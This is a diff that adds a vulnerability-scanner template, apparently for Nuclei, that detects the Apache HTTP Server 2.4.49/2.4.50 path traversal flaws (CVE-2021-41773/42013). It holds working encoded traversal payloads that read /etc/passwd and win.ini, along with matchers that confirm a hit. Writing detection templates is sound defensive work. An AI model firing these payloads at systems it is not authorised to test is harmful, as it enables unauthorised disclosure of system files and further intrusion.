@@ -1,0 +1,32 @@
+id: apache-path-traversal-rce
+info:
+  name: Apache HTTP Server 2.4.49/2.4.50 Path Traversal & RCE (CVE-2021-41773 / CVE-2021-42013)
+  author: phantomscan
+  severity: critical
+  description: Path traversal and file disclosure / remote code execution in Apache HTTP Server 2.4.49 and 2.4.50 via URL encoded dot-dot-slash characters.
+  tags: cve,rce,apache,traversal,critical
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-42013
+  metadata:
+    cve-id: CVE-2021-41773
+    cvss-score: 9.8
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "{{BaseURL}}/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
+      - "{{BaseURL}}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[extensions\\]"
+          - "\\[fonts\\]"
+        condition: or
